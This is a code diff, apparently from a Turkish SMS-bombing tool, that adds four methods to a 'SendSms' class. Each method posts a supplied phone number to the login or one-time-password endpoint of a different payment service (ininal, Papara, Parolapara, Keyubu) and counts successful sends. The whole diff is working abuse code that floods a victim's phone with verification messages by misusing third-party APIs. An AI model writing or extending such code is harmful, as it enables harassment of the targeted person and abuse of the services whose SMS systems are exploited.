@@ -792,3 +792,59 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")
+
+    #ininal
+    def Ininal(self):
+        try:
+            url = "https://api.ininal.com:443/api/v1/auth/login"
+            json = {"phoneNumber": self.phone}
+            r = requests.post(url, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.ininal.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.ininal.com")
+
+    #papara
+    def Papara(self):
+        try:
+            url = "https://merchant-api.papara.com:443/api/v1/merchant/login"
+            json = {"phoneNumber": self.phone}
+            r = requests.post(url, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> merchant-api.papara.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> merchant-api.papara.com")
+
+    #parolapara
+    def Parolapara(self):
+        try:
+            url = "https://api.parolapara.com:443/api/v1/auth/sendOtp"
+            json = {"phoneNumber": self.phone}
+            r = requests.post(url, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.parolapara.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.parolapara.com")
+
+    #keyubu
+    def Keyubu(self):
+        try:
+            url = "https://api.keyubu.com:443/api/v1/auth/sendOtp"
+            json = {"phoneNumber": self.phone}
+            r = requests.post(url, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.keyubu.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.keyubu.com")
